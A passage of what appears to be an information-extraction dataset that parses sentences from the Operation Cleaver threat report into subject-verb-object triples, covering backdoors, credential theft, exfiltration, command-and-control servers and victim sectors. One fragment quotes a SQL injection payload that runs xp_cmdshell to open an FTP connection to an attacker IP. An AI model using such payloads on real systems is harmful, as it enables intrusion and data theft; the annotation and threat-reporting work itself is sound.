"executing", "S": "he command and control", "O": ["batch scripts"]}, "upgrading": {"A": "upgrading", "S": "he command and control"}}], "\n</section>\n\n<section>\n<heading>zhMimikatz and MimikatzWrapper</heading>\nTwo similar applications were developed by Operation Cleaver in order automate the execution\nof Mimikatz": [{"automate": {"A": "automate", "S": "Two similar applications", "O": ["the execution of Mimikatz"]}}], "\n</section>\n\n<section>\n  <heading>Jasus</heading>\n                                 \n  Jasus is an ARP cache poisoner developed by the Operation Cleaver team": [{"is": {"A": "is", "S": "Jasus", "O": ["an ARP cache poisoner developed by the Operation Cleaver team"]}}], "\n\n  When a command is received from the server, the results are stored in a central location on disk\n  that the PVZ tools utilize": [{"is received": {"A": "is received", "O": ["a command", "from the server"]}}, {"are stored": {"A": "are stored", "O": ["in a central location on disk that the PVZ tools utilize", "the results"]}}], " Fully compromised VPN credentials meant their entire remote access infrastructure\n and supply chain was under the control of the Cleaver team, allowing permanent persistence\n under compromised credentials": [{"allowing": {"A": "allowing", "S": "Fully compromised VPN credentials", "O": ["under compromised credentials", "permanent persistence"]}, "meant": {"A": "meant", "S": "Fully compromised VPN credentials", "O": ["their entire remote access infrastructure and supply chain was under the control of the Cleaver team"]}}], " The attackers targeted research\n efforts, student information, student housing, and financial aid systems": [{"targeted": {"A": "targeted", "S": "The attackers", "O": ["research efforts, student information, student housing, and financial aid systems"]}}], " A method was added to detect what security related\n  software is installed": [{"detect": {"A": "detect", "S": "A method", "O": ["what security related software is installed"]}}], " The email data exfiltration method also underwent modification\n to be activated at a scheduled interval": [{"underwent": {"A": "underwent", "S": "The email data exfiltration method", "O": ["modification", "to be activated at a scheduled interval"]}}], "\n  menrad(dot)de/js/jquery/default.aspx and the command and control protocol only uses\n  HTTP": [{"uses": {"A": "uses", "S": "the command and control protocol", "O": ["HTTP"]}}], " This data could enable them, or affiliated organizations,\n to target and potentially sabotage ICS and SCADA environments with ease": [{"target and potentially sabotage": {"A": "target and potentially sabotage", "S": "them, or affiliated organizations", "O": ["ICS and SCADA environments", "with ease"]}}], " The file is downloaded Base64-encoded inside of the SOAP response": [{"is downloaded": {"A": "is downloaded", "O": ["inside of the SOAP response", "Base64-encoded", "The file"]}}], "\n\nThe PVZ tool chain includes a variety of functionality, such as HTTP command and control\ncommunications with an ASPX server-side component, a denial of service tool they developed, and\nthe public project named XYNTService used to run ordinary applications as services": [{"includes": {"A": "includes", "S": "The PVZ tool chain", "O": ["HTTP command and control communications with an ASPX server-side component"]}}], " The tool chain is minimized\ndown to a command and control communications, keystroke logging, and clipboard monitoring": [{"is minimized down": {"A": "is minimized down", "O": ["to a command and control communications", "The tool chain"]}}], " This allowed the attackers to use\ninfrastructure that was not theirs to exfiltrate information": [{"use": {"A": "use", "S": "the attackers", "O": ["infrastructure that was not theirs", "to exfiltrate information"]}}], " WndTest installs as a service and has been observed attempting to\nimpersonate Adobe Report Service": [{"installs": {"A": "installs", "S": "WndTest", "O": ["as a service"]}, "impersonate": {"A": "impersonate", "S": "WndTest", "O": ["Adobe Report Service"]}}], " Messages were sent using an open SMTP relay at BeyondSys.com with\nthe sender email address dyanachear(at)beyondsys.com": [{"were sent": {"A": "were sent", "O": ["using an open SMTP relay at BeyondSys.com", "Messages", "with the sender email address dyanachear(at)beyondsys.com"]}}], " Recent versions use the resume-\n  based methods reported in the Initial Compromise sections": [{"use": {"A": "use", "S": "Recent versions", "O": ["the resume- based methods reported in the Initial Compromise sections"]}}], " SOAP traffic could easily be considered benign traffic, as it is not commonly seen in malware": [{"be considered": {"A": "be considered", "O": ["SOAP traffic", "benign traffic"]}}], " If it is unable to connect to the Internet,\n it will display a window to input proxy information": [{"display": {"A": "display", "S": "it", "O": ["to input proxy information", "a window"]}}], "\n</section>\n\n<section>\n  <heading>zhMimikatz</heading>\n  zhMimikatz executes the correct version of Mimikatz for the current system, and parses the results\n  for any cached credentials": [{"parses": {"A": "parses", "S": "zhMimikatz", "O": ["for any cached credentials", "the results"]}, "executes": {"A": "executes", "S": "zhMimikatz", "O": ["the correct version of Mimikatz for the current system"]}}], "\n  \n  When a positive result has been achieved, it will create a copy of itself with a modified\n  configuration stored as a PE resource, then send and execute the copy utilizing PsExec": [{"create": {"A": "create", "S": "it", "O": ["with a modified configuration stored as a PE resource", "a copy of itself"]}, "send": {"A": "send", "S": "it"}, "execute": {"A": "execute", "S": "it"}}], " This can involve launching attacks from the\ncompromised computer, or simply abusing access once it has been gained": [{"launching": {"A": "launching", "O": ["from the compromised computer", "attacks"]}}, {"abusing": {"A": "abusing", "O": ["once it has been gained", "access"]}}], " This allows them\n to easily connect to RDP servers inside the networks of their victims": [{"connect": {"A": "connect", "S": "them", "O": ["inside the networks of their victims", "to RDP servers"]}}], "                                                                    \n</caption>\n</section>\n\n<section>\n<heading>ATTACKER IP ADDRESSES</heading>\nOver the course of multiple incident response engagements related to Operation Cleaver, we\nwere able to identify a small set of IP addresses which were commonly used during the initial\nstages of an attack": [{"were commonly used": {"A": "were commonly used", "O": ["during the initial stages of an attack", "a small set of IP addresses"]}}], " The\n  backdoor additionally replaced the original malicious executable with an appropriately named\n  image file and padded the image file with null bytes in order to mirror the original file size": [{"replaced": {"A": "replaced", "S": "The backdoor", "O": ["with an appropriately named image file", "the original malicious executable"]}, "padded": {"A": "padded", "S": "The backdoor", "O": ["in order to mirror the original file size", "with null bytes", "the image file"]}}], " Its\n  main purpose is to create a channel that is capable of transporting information over the network": [{"create": {"A": "create", "S": "Its main purpose", "O": ["a channel that is capable of transporting information over the network"]}}], " This FTP upload functionality points\n to the command and control server, and is invoked by a command in the SOAP command and\n control channel": [{"points": {"A": "points", "S": "This FTP upload functionality", "O": ["to the command and control server"]}}, {"is invoked": {"A": "is invoked", "O": ["by a command in the SOAP command and control channel", "This FTP upload functionality"]}}], " The primary positive attribute\n  of Jasus is its poor detection ratio by the antivirus industry": [{"is": {"A": "is", "S": "The primary positive attribute of Jasus", "O": ["its poor detection ratio by the antivirus industry"]}}], " The\n  DELETE command then requests that the file be deleted from the infected system": [{"be deleted": {"A": "be deleted", "O": ["from the infected system", "the file"]}}], "\n   \n  Csext also has email functionality similar to TinyZBot": [{"has": {"A": "has", "S": "Csext", "O": ["email functionality similar to TinyZBot"]}}], " Multiple domains were\nregistered in order to make the download sites seem more\nrealistic": [{"were registered": {"A": "were registered", "O": ["in order to make the download sites seem more realistic", "Multiple domains"]}}], " The following is a list of supported features:\n<list>\n  \u2022   SMTP exfiltration\n  \u2022   Log keystrokes\n  \u2022   Monitor clipboard activity\n  \u2022   Enable a SOAP-based command and control channel\n  \u2022   Self-updating\n  \u2022   Download and execute arbitrary code\n  \u2022   Capture screenshots        \n  \u2022   Extract saved passwords for Internet Explorer\n  \u2022   Install as a service\n  \u2022   Establish persistence by shortcut in startup folder\n  \u2022   Provide unique malware campaign identifiers for tracking and control purposes\n  \u2022   Deceptive execution methods\n  \u2022   Dynamic backdoor configuration\n  \u2022   FTP exfiltration\n  \u2022   Security software detection\n  \u2022   Ability to disable Avira antivirus\n  \u2022   Ability to modify PE resources\n  \u2022   Dynamic plugin structure\n</list>\n</section>\n<footer>47</footer>\n\f \n<header>\nOPERATION\nCLEAVER                                                                                                                               <figure>5468696e6b204576696c2c20446f20476f6f64</figure>\n\n</header>\n\n<section>\n<heading>TinyZBot Command and Control Protocol</heading>\n\nThe command and control mechanism for TinyZBot utilizes SOAP communicating over HTTP": [{"utilizes": {"A": "utilizes", "S": "The command and control mechanism for TinyZBot", "O": ["SOAP communicating over HTTP"]}}], " The level of access seemed ubiquitous: Active Directory domains\n were fully compromised, along with entire Cisco Edge switches, routers, and internal networking\n infrastructure": [{"were fully compromised": {"A": "were fully compromised", "O": ["along with entire Cisco Edge switches, routers, and internal networking infrastructure", "Active Directory domains"]}}], " To date it has successfully evaded detection by existing security\n  technologies": [{"evaded": {"A": "evaded", "S": "it", "O": ["detection by existing security technologies"]}}], " Once this is complete, it\n  then continues to scan a set of configured IP addresses on the local subnet to determine which\n  IP addresses have SMB related ports open": [{"scan": {"A": "scan", "S": "it", "O": ["on the local subnet", "to determine which IP addresses have SMB related ports open", "a set of configured IP addresses"]}}], "\n\nThe following IP addresses hosted FTP servers that were used in the infection of targets or in\nthe exfiltration of information": [{"hosted": {"A": "hosted", "S": "The following IP addresses", "O": ["FTP servers"]}, "were used": {"A": "were used", "O": ["in the infection of targets", "FTP servers"]}}], " This feature can be abused to enable a reverse connecting shell, which can be\nused to remotely control a target": [{"enable": {"A": "enable", "S": "This feature", "O": ["a reverse connecting shell"]}}, {"remotely control": {"A": "remotely control", "S": "a reverse connecting shell", "O": ["a target"]}}], " Operation Cleaver has a strong focus on stealing\n  confidential/privileged information, and they have utilized a few methods in order to facilitate this\n  objective": [{"stealing": {"A": "stealing", "S": "Operation Cleaver", "O": ["confidential/privileged information"]}}], "\n\n\n<figure></figure>\n\n                       <caption>Figure 19: GET request to www.microsoft.com fakes the r\u00e9sum\u00e9 submission.</caption>\n        \n  When the victim hits submit, the r\u00e9sum\u00e9 submitter does a GET request to microsoft.com in order\n  to make it seem like it is submitting something, then claims success": [{"does": {"A": "does", "S": "the r\u00e9sum\u00e9 submitter", "O": ["in order to make it seem like it is submitting something", "a GET request", "to microsoft.com", "When the victim hits submit"]}}], "\n\n</section>\n\n\n<footer>46</footer>\n\f\n<header>#OPCLEAVER</header>\n\n<section>\n  <heading>PERSISTENCE</heading>\n  Persistence is the means of maintaining access to a compromised network": [{"is": {"A": "is", "S": "Persistence", "O": ["the means of maintaining access to a compromised network"]}}], " They\n replace the existing Notepad.exe on the infected machine, and when run they call out to a\n remote server and execute any shell code returned by the remote server": [{"execute": {"A": "execute", "S": "they", "O": ["any shell code returned by the remote server"]}, "call out": {"A": "call out", "S": "they", "O": ["to a remote server"]}}], " In\norder to take advantage of this job opportunity, the victim\nneeded to use the fake r\u00e9sum\u00e9 submission application\nsupplied by the malicious recruiter": [{"use": {"A": "use", "S": "the victim", "O": ["the fake r\u00e9sum\u00e9 submission application supplied by the malicious recruiter", "In order to take advantage of this job opportunity"]}}], "\n</section>\n<section>\n\n  <heading>TinyZBot</heading>\n  TinyZBot is a backdoor developed in C#": [{"is": {"A": "is", "S": "TinyZBot", "O": ["a backdoor developed in C#"]}}], "\n \u2022\t Assets (both cyber and physical) and logistics information were compromised at major airline\n    operators, airports, and transportation companies": [{"were compromised": {"A": "were compromised", "O": ["at major airline operators, airports, and transportation companies", "Assets (both cyber and physical) and logistics information"]}}], " In relation to Operation Cleaver, it is used as the\ncommand and control protocol for TinyZBot, which was the preferred backdoor, and underwent\nlong-term development": [{"is used": {"A": "is used", "O": ["as the command and control protocol for TinyZBot", "it"]}}], "\n\n</section>\n\n\n<footer>56</footer>\n\f\n<header>#OPCLEAVER</header>\n\n<section>\n  <heading>PVZ (cont.)</heading>\n  The components are as follows:\n<list>\n  \u2022   PVZ-In\n  \u2022   PVZ-Out\n  \u2022   Syn Flooder\n  \u2022   LoggerModule\n  \u2022   XYNTService\n  \u2022   Jasus\n</list>\n  XYNTService was not developed by the Cleaver team, but instead is a publicly available project\n  which executes an executable as a service": [{"executes": {"A": "executes", "S": "a publicly available project", "O": ["an executable", "as a service"]}}], "\n</section>\n\n<section>\n<heading>SYN Flooder</heading>\nSYN Flooder is a simple network based denial of service tool": [{"is": {"A": "is", "S": "SYN Flooder", "O": ["a simple network based denial of service tool"]}}], " This allowed them to use existing\ncommand line utilities available on their targets in order to upload information": [{"upload": {"A": "upload", "S": "them", "O": ["information"]}, "use": {"A": "use", "S": "them", "O": ["existing command line utilities available on their targets"]}}], " Shortly after, the main\n application is launched": [{"is launched": {"A": "is launched", "O": ["the main application"]}}], " The message was intended to look like common Viagra spam from China, but\n would be sent with the keystroke logging data as attachments, as well as system information": [{"be sent": {"A": "be sent", "O": ["with the keystroke logging data as attachments, as well as system information", "The message"]}}], "\n\nThe IP address 78.109.194.114 served as a source for one of the primary attackers": [{"served": {"A": "served", "S": "The IP address 78.109.194.114", "O": ["as a source for one of the primary attackers"]}}], "\n\n  The following is a breakdown by country of which industries were targeted and/or victimized:\n\n<list>\n         Canada                             \n         - Energy & Utilities                        \n         - Oil & Gas         \n         - Hospitals                        \n                                            \n                            \n         China                              \n         - Aerospace\n                        \n                 \n         England\n         - Education                  \n              \n\n         France                             \n         - Oil & Gas                        \n                       \n\n         Germany                      \n         - Telecommunications               \n                                      \n                   \n         India                              \n         - Education                        \n                                            \n                                            \n         Israel                             \n         - Aerospace\n         - Education\n\n         \n         Kuwait              \n         - Oil & Gas         \n         - Telecommunications\n\n\n         Mexico            \n         - Oil & Gas         \n\n\n         Pakistan            \n         - Airports          \n         - Hospitals\n         - Technology        \n         - Airlines          \n\n                    \n         Qatar\n         - Oil & Gas\n         - Government           \n         - Airlines\n                    \n                    \n         Saudi Arabia        \n         - Oil & Gas         \n         - Airports          \n\n\n         South Korea\n         - Airports\n         - Airlines\n         - Education\n         - Technology\n         - Heavy Manufacturing\n\n\n         Turkey\n         - Oil & Gas\n\n\n         United Arab Emirates\n         - Government\n         - Airlines\n\n\n         United States\n         - Airlines\n         - Education\n         - Chemicals\n         - Transportation\n         - Energy & Utilities\n         - Military/Government\n         - Defense Industrial Base\n</list>                                                                                                       \n<footer>13</footer>\n\f\n<header>\n\nOPERATION\nCLEAVER                                                                                                                               <figure>5468696e6b204576696c2c20446f20476f6f64</figure>\n\n</header>\n\n Cleaver\u2019s level of access into each organization varied greatly, including completely compromised\n systems and networks, Active Directory domain controllers and credentials, compromised data\n repositories and stolen VPN credentials": [{"including": {"A": "including", "S": "Cleaver\u2019s level of access into each organization", "O": ["compromised data repositories"]}}], " The web shell could\nthen be installed via xp_cmdshell, or any other method which would grant the attacker write\naccess": [{"be installed": {"A": "be installed", "O": ["via xp_cmdshell, or any other method which would grant the attacker write access", "The web shell"]}}], " In order to infect users, they combined the original Easy Resume Creator\n  Pro product with malware by using a binder they developed internally named Binder_1": [{"combined": {"A": "combined", "S": "they", "O": ["with malware", "by using a binder they developed internally named Binder_1", "the original Easy Resume Creator Pro product"]}}], "\n</section>\n\n<section>\n  <heading>PVZ-Out</heading>\n  PVZ-Out is the other half of the command and control channel, primarily uploading results of\n  commands and keystroke logging data to a remote server": [{"is": {"A": "is", "S": "PVZ-Out", "O": ["the other half of the command and control channel"]}, "uploading": {"A": "uploading", "S": "PVZ-Out", "O": ["results of commands and keystroke logging data", "to a remote server"]}}], " Its main functionality allows for a client and server communication channel, allowing\nfor information to be transported over the network simply": [{"allows": {"A": "allows", "S": "Its main functionality", "O": ["for a client and server communication channel"]}, "allowing": {"A": "allowing", "S": "Its main functionality", "O": ["for information to be transported over the network simply"]}}], " This group includes the results of the Shell Creator mentioned in the\n  Attribution section, as well as ASPX backdoors used by Nesha": [{"includes": {"A": "includes", "S": "This group", "O": ["the results of the Shell Creator mentioned in the Attribution section, as well as ASPX backdoors used by Nesha"]}}], " These attacks were debilitating and\nimpacted the availability of online banking services": [{"impacted": {"A": "impacted", "S": "These attacks", "O": ["the availability of online banking services"]}}], " This form, like the rest of the\n  submission forms, only stores the submitted information while the application is running": [{"stores": {"A": "stores", "S": "This form", "O": ["the submitted information", "while the application is running"]}}], " The exploit allows for\nescalation of privileges on unpatched Windows operating systems from an unprivileged user to\nkernel-level privilege": [{"allows": {"A": "allows", "S": "The exploit"}}], " This increase in privileges\nallows for the attacker to gain access to privleged areas of the operating system as well as to\ninfect other computers on the target network": [{"allows": {"A": "allows", "S": "This increase in privileges", "O": ["the attacker"]}}, {"infect": {"A": "infect", "S": "the attacker", "O": ["other computers on the target network"]}, "gain": {"A": "gain", "S": "the attacker", "O": ["access to privleged areas of the operating system"]}}], "\n The AppUsageId (at this point named AppType) was an identifier used by this organization in\n order to differentiate between targets infected with TinyZBot, meaning they could effectively\n run multiple campaigns using the same command and control server and know which target\n was infected": [{"know": {"A": "know", "S": "they", "O": ["which target was infected"]}, "run": {"A": "run", "S": "they", "O": ["using the same command and control server", "multiple campaigns"]}}, {"differentiate": {"A": "differentiate", "S": "The AppUsageId (at this point named AppType)", "O": ["between targets infected with TinyZBot"]}}], "\n    \n  We observed the Operation Cleaver team using Cain & Abel for extracting credentials from caches\n  and the network when they are confident that there is little to no antivirus protection on the infected\n  target": [{"using": {"A": "using", "S": "the Operation Cleaver team", "O": ["for extracting credentials from caches and the network", "Cain & Abel"]}}], "\n\n\n<footer>58</footer>\n\f\n<header>#OPCLEAVER</header>\n\n\n  We have seen wndTest communicate with the following servers:\n<list>\n  \u2022   209.208.97.44, Orlando, Florida, USA, www.lat(dot)am\n  \u2022   23.238.17.181, Tulsa, Oklahoma, USA, regulatorfix(dot)com\n  \u2022   209.208.97.44, Orlando, Florida, USA, www.asiess(dot)com\n  \u2022   198.50.100.210, Quebec, Canada, halon(dot)com.br\n  \u2022   207.182.142.68, Columbus, Ohio, USA\n  \u2022   95.211.191.247, Amsterdam, Noord-Holland, Netherlands\n</list>\n</section>\n\n<section>\n  <heading>Csext</heading>\n  Csext is a backdoor application developed in C# which runs as a service": [{"communicate": {"A": "communicate", "S": "wndTest", "O": ["with the following servers"]}}, {"is": {"A": "is", "S": "Csext", "O": ["a backdoor application developed in C#"]}, "runs": {"A": "runs", "S": "Csext", "O": ["as a service"]}}], "\n\n When this information is entered, the results are cached\n in a location the dropped malware can access": [{"are cached": {"A": "are cached", "O": ["the results", "in a location the dropped malware can access"]}}], " Its method of exfiltrating the logged keystrokes\n relied upon a hardcoded email address stored in the binary": [{"relied": {"A": "relied", "S": "Its method of exfiltrating the logged keystrokes", "O": ["upon a hardcoded email address stored in the binary"]}}], "\n\n  The version compiled on June 23, 2014, added functionality which allowed screenshots of the\n  desktop to be taken": [{"allowed": {"A": "allowed", "S": "The version compiled on June 23, 2014", "O": ["screenshots of the desktop", "to be taken"]}}], "\n  </section>\n\n  <section>\n  <heading>EXFILTRATION</heading>\n  \n  Exfiltration is the process of moving information to an external site": [{"is": {"A": "is", "S": "Exfiltration", "O": ["the process of moving information to an external site"]}}], " Then an iterative methodology is applied to brute\n  forcing each SMB enabled target with each credential that was extracted from the cache": [{"brute forcing": {"A": "brute forcing", "S": "an iterative methodology", "O": ["each SMB enabled target", "with each credential that was extracted from the cache"]}}], "\n\n       bestviagra4u.cn\n</list>\nThe files being exfiltrated are added to the email as attachments": [{"are added": {"A": "are added", "O": ["to the email", "The files being exfiltrated", "as attachments"]}}], "\n The initial version did not provide any means of receiving commands and was obfuscated with\n SmartAssembly": [{"was obfuscated": {"A": "was obfuscated", "O": ["with SmartAssembly", "The initial version"]}}], " They were observed conducting SQL injection attacks": [{"conducting": {"A": "conducting", "S": "They", "O": ["SQL injection attacks"]}}], "\n Compromised network infrastructure included Cisco VPNs as well as Cisco switches and routers": [{"included": {"A": "included", "S": "Compromised network infrastructure", "O": ["Cisco VPNs as well as Cisco switches and routers"]}}], " This allows for commands to be\n  sent to all bots for a campaign as well as individual control": [{"be sent": {"A": "be sent", "O": ["to all bots for a campaign", "commands"]}}], "\n   \n  <figure></figure>\n\n                     <caption>Figure 24: The ASPX backdoor named \u201cZh0uSh3ll\u201d, allowing SQL queries.</caption>\n\n\n\n\n<footer>55</footer>\n\f\n<header> \nOPERATION\nCLEAVER                                                                                                                               <figure>5468696e6b204576696c2c20446f20476f6f64</figure>\n\n</header>\n\n<figure></figure>\n                      <caption>Figure 25: The ASPX backdoor named \u201cZh0uSh3ll\u201d, allowing file</caption>\n\n\n\n This organization utilized backdoors which masqueraded as varying versions of Notepad": [{"masqueraded": {"A": "masqueraded", "S": "backdoors", "O": ["as varying versions of Notepad"]}}, {"utilized": {"A": "utilized", "S": "This organization", "O": ["backdoors"]}}], " The known command and control server\n  for PVZ-Out is located at http://www.gesunddurchsjahr(dot)de/tor/default.aspx": [{"is located": {"A": "is located", "O": ["at http://www.gesunddurchsjahr(dot)de/tor/default.aspx", "The known command and control server for PVZ-Out"]}}], "\nSQL injection payloads used by this organization have been double encoded": [{"been double encoded": {"A": "been double encoded", "O": ["SQL injection payloads"]}, "used": {"A": "used", "S": "this organization", "O": ["SQL injection payloads"]}}], "\n\n  The IP address 159.253.144.209 was a source for a secondary attacker in various\n  compromises": [{"was": {"A": "was", "S": "The IP address 159.253.144.209", "O": ["a source for a secondary attacker in various compromises"]}}], " The UPLOAD command\n  requests that this file is then uploaded over SOAP to the command and control server": [{"is then uploaded": {"A": "is then uploaded", "O": ["over SOAP", "this file", "to the command and control server"]}}], " When executed, they determine which version\nof Mimikatz to use based on whether the computer\u2019s version of Windows is 32-bit or 64-bit": [{"determine": {"A": "determine", "S": "they", "O": ["which version of Mimikatz to use", "based on whether the computer\u2019s version of Windows is 32-bit or 64-bit"]}}], "\nsp_configure%20@b2,%201;RECONFIGURE;--%20\n</list>\nThen connect outbound via anonymous FTP:\n<list>\nhttp://localhost/Demos/demo.cfm?Edit%26ID=111;declare%20@b1%20varchar(8000);set%20@\nb1=%20ftp -A 108.175.152.230;%20exec%20master..xp_cmdshell%20@b1--%20\n</list>\n</section>\n\n<section>\n<heading>Spear-Phishing Campaign</heading>\nUsing messaging methods such as email, attackers can social engineer users into downloading\nand executing software, which quietly installs malware alongside of the desired program": [{"installs": {"A": "installs", "S": "downloading and executing software", "O": ["malware", "alongside of the desired program"]}}, {"connect": {"A": "connect", "O": ["outbound", "via anonymous FTP"]}}, {"social engineer": {"A": "social engineer", "S": "attackers", "O": ["users", "into downloading and executing software", "Using messaging methods such as email"]}}], "\n\n The next day, April 25, 2013, a new version was compiled which allowed for self-deletion": [{"allowed": {"A": "allowed", "S": "a new version", "O": ["for self-deletion"]}}], " It is a command line utility capable of\nbeing invoked by PVZ-In": [{"being invoked": {"A": "being invoked", "S": "PVZ-In", "O": ["a command line utility"]}}], "     \n                         \n  Operation Cleaver has, over the past several years, conducted a significant global surveillance\n  and infiltration campaign": [{"conducted": {"A": "conducted", "S": "Operation Cleaver", "O": ["a significant global surveillance and infiltration campaign"]}}], "\n</section>\n\n<section>\n  <heading>PVZ-In</heading>      \n  The purpose of PVZ-In is to communicate with a command and control server": [{"communicate": {"A": "communicate", "S": "PVZ-In", "O": ["with a command and control server"]}}], "\n</section>\n\n\n\n<footer>54</footer>\n\f\n<header>#OPCLEAVER</header>\n\n<section>\n  <heading>Command and Control Servers</heading>\n<list>\n        \u2022   88.150.214.168, United Kingdom, microsoftactiveservices(dot)com\n        \u2022   95.211.241.249, Amsterdam, Noord-Holland, Netherlands\n        \u2022   88.150.214.166, United Kingdom\n        \u2022   173.192.144.68, Seattle, Washington, USA\n        \u2022   188.227.180.213, United Kingdom\n        \u2022   192.111.145.197, Rochester, New York, USA\n</list>\n</section>\n\n<section>\n  <heading>Backdoors</heading>\n\n  Multiple backdoors were used by this organization": [{"were used": {"A": "were used", "S": "this organization", "O": ["Multiple backdoors"]}}], " The known command and control server is located at http://kundenpflege": [{"is located": {"A": "is located", "O": ["The known command and control server", "at http://kundenpflege. menrad(dot)de/js/jquery/default.aspx"]}}], " There are limitless\n  methods of persistence; the following are techniques and tools for persistence used by Cleaver": [{"used": {"A": "used", "S": "Cleaver", "O": ["the following are techniques and tools for persistence"]}}], " The creator generates\nan ASPX web shell using user input as well as a collection of templates": [{"generates": {"A": "generates", "S": "The creator", "O": ["an ASPX web shell", "using user input as well as a collection of templates"]}}], "\n   \n  An ASPX backdoor named Zh0uSh311 was located on live servers as well as recovered fro\n  a staging server": [{"was located": {"A": "was located", "O": ["on ive servers", "An ASPX backdoor named Zh0uSh311"]}, "recovered": {"A": "recovered", "O": ["fro a staging server", "An ASPX backdoor named Zh0uSh311"]}}], "\n</section>\n\n<section>\n<heading>Logger Module</heading>\nLogger Module observes the user\u2019s actions and records them to a file": [{"records": {"A": "records", "S": "Logger Module", "O": ["them", "to a file"]}, "observes": {"A": "observes", "S": "Logger Module", "O": ["the user\u2019s actions"]}}], " The recorded actions include\nmouse clicks, active windows, keypresses, as well as clipboard data": [{"include": {"A": "include", "S": "The recorded actions", "O": ["mouse clicks"]}}], " This email functionality is used to exfiltrate\n  the results of commands from the command file which can also include requests like gathering\n  user information": [{"exfiltrate": {"A": "exfiltrate", "S": "This email functionality", "O": ["the results of commands from the command file which can also include requests like gathering user information"]}}], " The\n  operators of the blog IranRedLine.org, which comments on Iran\u2019s nuclear weapons efforts, has\n  mentioned in multiple posts having been the target of debilitating brute-force authentication attacks\n  from IP addresses registered to the same Tarh Andishan team found in Cleaver": [{"mentioned": {"A": "mentioned", "S": "The operators of the blog IranRedLine.org, which comments on Iran\u2019s nuclear weapons efforts", "O": ["having been the target of debilitating brute-force authentication attacks from IP addresses registered to the same Tarh Andishan team found in Cleaver", "in multiple posts"]}}], "\n\n On the server side, we can see our message has been received:\n\n<figure></figure>\n\n\n If stricter egress filtering is enabled, the attackers can use zhCat to also XOR encrypt the traffic\n with a shared key": [{"use": {"A": "use", "S": "the attackers", "O": ["zhCat", "to also XOR encrypt the traffic with a shared key"]}}], " The TinyZBot queries the server in\n  order to enumerate all files currently available to it": [{"queries": {"A": "queries", "S": "The TinyZBot", "O": ["the server", "in order to enumerate all files currently available to it"]}}], " SmartAssembly was reused again": [{"was reused": {"A": "was reused", "O": ["SmartAssembly"]}}], " The purpose is deception, to make\n  the binder indistinguishable from the desired application": [{"make": {"A": "make", "O": ["the binder", "indistinguishable from the desired application"]}}], "\n\n</section>\n<section>\n <heading>Iran\u2019s Cyber Hacking Skills Have Evolved</heading>\n \u2022\t Initial compromise techniques include SQL injection, web attacks, and creative deception-\n    based attacks \u2013 all of which have been implemented in the past by Chinese and Russian\n    hacking teams": [{"include": {"A": "include", "S": "Initial compromise techniques", "O": ["SQL injection, web attacks, and creative deception- based attacks"]}}], " Stuxnet was an\neye-opening event for Iranian authorities, exposing them to the\nworld of physical destruction via electronic means": [{"exposing": {"A": "exposing", "S": "Stuxnet", "O": ["to the world of physical destruction via electronic means", "them"]}}], "\n\n<figure></figure>\n\n                          \n On the server side, we can see this information being received:\n      \n<figure></figure>\n\n zhCat has a variety of other features such as port mirroring as well as traffic redirecting": [{"has": {"A": "has", "S": "zhCat", "O": ["a variety of other features such as port mirroring as well as traffic redirecting"]}}], " In May 2014, evidence emerged of a highly targeted waterhole attack that leveraged social\nmedia, dubbed Operation Newscaster, which was uncovered by iSight Partners": [{"leveraged": {"A": "leveraged", "S": "a highly targeted waterhole attack", "O": ["social media"]}}], "\n\n  Commands, updates and files to drop and execute are stored as files on the SOAP server, and\n  access is restricted by the AppUsageID as well as the bot GUID": [{"are stored": {"A": "are stored", "O": ["Commands, updates and files to drop and execute", "as files on the SOAP server"]}}], "\n \u2022\t Confidential critical infrastructure documents were harvested from major educational\n    institutions around the world": [{"were harvested": {"A": "were harvested", "O": ["from major educational institutions around the world", "Confidential critical infrastructure documents"]}}], " This also allowed for separate commands to be supplied to different targets\n without the need for per-bot commands": [{"be supplied": {"A": "be supplied", "O": ["to different targets", "separate commands"]}}], " These\n versions began to include a new method of installing as a service": [{"include": {"A": "include", "S": "These versions", "O": ["a new method of installing as a service"]}}], "\n\nPivoting is the process of leveraging access from one compromised computer in order to gain\naccess to additional systems on the target network": [{"is": {"A": "is", "S": "Pivoting", "O": ["the process of leveraging access from one compromised computer in order to gain access to additional systems on the target network"]}}], " When executed, and before\nany connection to an instance of the web shell is initiated, the shell client communicates with\nfreegeoip.net in order to get the external IP address of the current user": [{"communicates": {"A": "communicates", "S": "the shell client", "O": ["in order to get the external IP address of the current user"]}}], " Avira antivirus was specifically targeted and disabled, due to its detection of\n  the new keystroke logger module added in this version": [{"was specifically targeted and disabled": {"A": "was specifically targeted and disabled", "O": ["Avira antivirus"]}}, {"added": {"A": "added", "O": ["in this version", "the new keystroke logger module"]}}], " This log was generated during the usage of the nbrute utility, which brute-forces network\n credentials and relies on NMAP to do so": [{"brute-forces": {"A": "brute-forces", "S": "the nbrute utility", "O": ["network credentials"]}}], "\n\n Compromised systems include Microsoft Windows web servers running IIS and ColdFusion,\n Apache with PHP, many variants of Microsoft Windows desktops and servers, and Linux servers": [{"include": {"A": "include", "S": "Compromised systems", "O": ["Microsoft Windows web servers running IIS and ColdFusion, Apache with PHP, many variants of Microsoft Windows desktops and servers, and Linux servers"]}}], "\n<list>                                                                                          \n        \u2022 Teledyne-Jobs.com\n        \u2022 Doosan-Job.com\n        \u2022 NorthropGrumman.net\n</list>\n<figure></figure>\n<caption>Figure 16: When the r\u00e9sum\u00e9 submitting\napplication is executed, a splash screen is\ndisplayed.</caption>  \n\n At this point, the r\u00e9sum\u00e9 submission application checks the\n Internet connection": [{"checks": {"A": "checks", "S": "the r\u00e9sum\u00e9 submission application", "O": ["the Internet connection"]}}], "\n\n\n\n<footer>57</footer>\n\f\n<header> \nOPERATION\nCLEAVER                                                                                                                               <figure>5468696e6b204576696c2c20446f20476f6f64</figure>\n\n</header>\n\nData uploaded is often compressed, which can make it more difficult to detect the exfiltration of\nsensitive information": [{"make": {"A": "make", "O": ["more difficult to detect the exfiltration of sensitive information", "it"]}}, {"is often compressed": {"A": "is often compressed", "O": ["Data uploaded"]}}], "\n</section>\n<section>\n<heading>SQL Injection</heading>\nSQL injection is a very common and simple attack method": [{"is": {"A": "is", "S": "SQL injection", "O": ["a very common and simple attack method"]}}], "\n\n<figure></figure>\n</section>\n\n<footer>43</footer>\n\f\n<header>\nOPERATION\nCLEAVER                                                                                                                               <figure>5468696e6b204576696c2c20446f20476f6f64</figure>\n\n</header>\n<section>\n <heading>zhCat (cont.)</heading>\n If we observe the network communications during this transfer, we can see the following HTTP\n POST request": [{"see": {"A": "see", "S": "we", "O": ["the following HTTP POST request"]}}], "\n</section>\n\n<section>\n<heading>SOAP</heading>\nSOAP is a sub-protocol communicated via HTTP": [{"is": {"A": "is", "S": 